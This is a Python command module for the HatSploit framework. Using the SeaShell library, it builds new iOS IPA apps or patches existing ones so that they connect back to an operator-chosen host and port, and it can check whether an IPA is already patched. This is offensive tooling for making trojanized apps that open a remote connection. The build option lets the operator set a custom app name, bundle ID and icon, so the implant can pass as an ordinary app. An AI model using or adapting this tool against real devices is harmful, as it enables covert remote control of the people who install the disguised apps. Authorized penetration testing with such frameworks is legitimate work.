"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.core.ipa import IPA
from seashell.core.hook import Hook

from pex.proto.tcp import TCPTools

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "manage",
            'Name': "ipa",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Build or patch IPA file.",
            'Usage': "ipa <option> [arguments]",
            'MinArgs': 1,
            'Options': {
                'check': ['<file>', 'Check if IPA is built or patched.'],
                'patch': ['<file>', 'Patch existing IPA file.'],
                'build': ['', 'Build brand new IPA file.']
            }
        }

    def rpc(self, *args):
        if len(args) < 4:
            return

        if args[0] == 'patch':
            hook = Hook(args[2], args[3])
            hook.patch_ipa(args[1])

        elif args[0] == 'build':
            ipa = IPA(args[2], args[3])
            ipa.generate(args[1])

    def run(self, argc, argv):
        local_host = TCPTools.get_local_host()

        if argv[1] == 'check':
            if IPA().check_ipa(argv[2]):
                self.print_information("IPA is built or patched.")
            else:
                self.print_information("IPA is original.")

        elif argv[1] == 'patch':
            if IPA().check_ipa(argv[2]):
                self.print_warning("This IPA was already patched.")
                return

            host = self.input_arrow(f"Host to connect back ({local_host}): ")
            host = host or local_host

            port = self.input_arrow("Port to connect back (8888): ")
            port = port or 8888

            hook = Hook(host, port)
            hook.patch_ipa(argv[2])

            self.print_success(f"IPA at {argv[2]} patched!")

        elif argv[1] == 'build':
            name = self.input_arrow("Application name (Mussel): ")
            bundle_id = self.input_arrow("Bundle ID (com.entysec.mussel): ")

            icon = self.input_question("Add application icon [y/N]: ")
            icon_path = None

            if icon.lower() in ['y', 'yes']:
                icon_path = self.input_arrow("Icon file path: ")

            host = self.input_arrow(f"Host to connect back ({local_host}): ")
            host = host or local_host

            port = self.input_arrow("Port to connect back (8888): ")
            port = port or 8888

            path = self.input_arrow("Path to save the IPA: ")

            ipa = IPA(host, port)
            ipa.set_name(name, bundle_id)

            if icon_path:
                ipa.set_icon(icon_path)

            self.print_success(f"IPA saved to {ipa.generate(path)}!")
